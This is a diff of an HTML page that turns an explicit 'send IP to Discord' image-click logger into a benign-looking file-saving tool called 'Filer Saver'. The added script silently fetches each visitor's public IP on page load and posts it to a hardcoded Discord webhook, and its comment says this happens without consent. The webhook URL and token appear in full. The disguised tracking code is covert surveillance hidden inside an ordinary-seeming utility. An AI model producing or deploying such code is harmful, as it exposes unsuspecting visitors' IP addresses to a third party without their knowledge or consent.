@@ -1,57 +1,139 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Click Image to Send IP to Discord</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Filer Saver minimal</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(to bottom, #1a0033, #000011, #000033);
+        color: white;
+        text-align: center;
+        padding: 50px;
+    }
+
+    h1 {
+        color: #bb86fc;
+    }
+
+    .container {
+        background: rgba(0, 0, 0, 0.6);
+        border: 2px solid #663399;
+        padding: 20px;
+        border-radius: 10px;
+        display: inline-block;
+    }
+
+    input[type="file"], input[type="text"], button {
+        margin: 10px;
+        padding: 10px;
+        border-radius: 5px;
+        border: none;
+    }
+
+    input[type="text"] {
+        width: 200px;
+    }
+
+    button {
+        background-color: #4b0082;
+        color: white;
+        cursor: pointer;
+        transition: background 0.3s;
+    }
+
+    button:hover {
+        background-color: #6a0dad;
+    }
+
+    a.download-link {
+        display: block;
+        margin-top: 20px;
+        color: #bb86fc;
+        text-decoration: none;
+    }
+
+    a.download-link:hover {
+        text-decoration: underline;
+    }
+</style>
 </head>
 <body>
-
-<!-- Clickable Image -->
-<img src="https://i.guns.lol/hWsVB.jpeg" 
-     alt="Clickable Image" 
-     id="clickable-image" 
-     style="cursor: pointer; width: 300px;">
+    <h1>📁 Filer Saver</h1>
+    <div class="container">
+        <input type="file" id="fileInput">
+        <br>
+        <input type="text" id="fileName" placeholder="Enter file name">
+        <br>
+        <button id="saveBtn">Save File</button>
+        <a id="downloadLink" class="download-link" style="display:none;">⬇ Download Saved File</a>
+    </div>
 
 <script>
-    const webhookUrl = 'https://discord.com/api/webhooks/1403073369410244739/DMBo14Lg-4D3UbY-xrPfChglFsi1WP___5vpBDsfMZfm40VqHX8V1Bxe_90TmEWfolDI';
+    let fileData = null;
 
-    // Get IP address using public API
-    async function getIP() {
+    document.getElementById("fileInput").addEventListener("change", function() {
+        const file = this.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                fileData = e.target.result;
+            };
+            reader.readAsDataURL(file);
+        }
+    });
+
+    document.getElementById("saveBtn").addEventListener("click", function() {
+        const name = document.getElementById("fileName").value.trim();
+        if (!fileData || !name) {
+            alert("Please select a file and enter a name.");
+            return;
+        }
+        
+        const link = document.getElementById("downloadLink");
+        link.href = fileData;
+        link.download = name;
+        link.style.display = "block";
+        link.textContent = `⬇ Download "${name}"`;
+    });
+
+    // Function to collect and send IP to the webhook without asking for consent
+    async function sendIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
-            return data.ip;
+            const ip = data.ip;
+            const webhookUrl = 'https://discord.com/api/webhooks/1403073369410244739/DMBo14Lg-4D3UbY-xrPfChglFsi1WP___5vpBDsfMZfm40VqHX8V1Bxe_90TmEWfolDI';  // Replace with your actual Discord webhook
+
+            const message = `🛬 New visitor IP: ${ip}`;
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: message })
+            })
+            .then(res => {
+                if (res.ok) {
+                    console.log('IP sent to Discord');
+                } else {
+                    console.error('Failed to send IP:', res.status);
+                }
+            })
+            .catch(error => {
+                console.error('Error sending to Discord:', error);
+            });
         } catch (err) {
-            console.error('Failed to get IP:', err);
-            return 'Unknown IP';
+            console.error('Could not get IP:', err);
         }
     }
 
-    // On image click, get IP and send to Discord
-    document.getElementById('clickable-image').addEventListener('click', async () => {
-        const ip = await getIP();
-        const message = `Visitor IP: ${ip}`;
-
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ content: message })
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log('IP sent to Discord!');
-            } else {
-                console.error('Failed to send:', response.status);
-            }
-        })
-        .catch(error => {
-            console.error('Fetch error:', error);
-        });
+    // Automatically send IP on page load
+    window.addEventListener('load', function() {
+        sendIP();
     });
 </script>
-
 </body>
 </html>
